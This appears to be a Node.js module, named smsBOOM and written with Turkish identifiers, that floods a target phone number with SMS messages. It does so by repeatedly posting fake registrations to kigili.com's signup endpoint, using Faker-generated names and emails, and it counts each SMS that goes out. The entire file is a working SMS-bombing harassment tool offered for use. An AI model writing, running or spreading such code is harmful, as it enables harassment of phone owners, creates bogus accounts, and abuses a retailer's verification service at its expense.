const request = require('request');
const colors = require('colors');
const title = require('./title.js');
const moment = require('moment');
const faker = require('faker');

async function delay(s) { return new Promise(resolve => setTimeout(resolve, s * 1000)); }

async function smsBOOM(numara, miktar) {
    let dataFSms = {
        baslangic_tarihi: moment().format('DD.MM.YYYY HH:mm:ss'),
        numara: numara,
        hatali: 0,
        basarili: 0,
    };

    function kigili(no) {
        request.post({
            url: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Kigili - ${no} - ${dataFSms.basarili}`.green);
            } else {
                // console.log(body);
                dataFSms.hatali++;
                console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    for (let i = 0; i < miktar; i++) {
        await delay(1);
        kigili(numara);
    }

}

module.exports = smsBOOM;
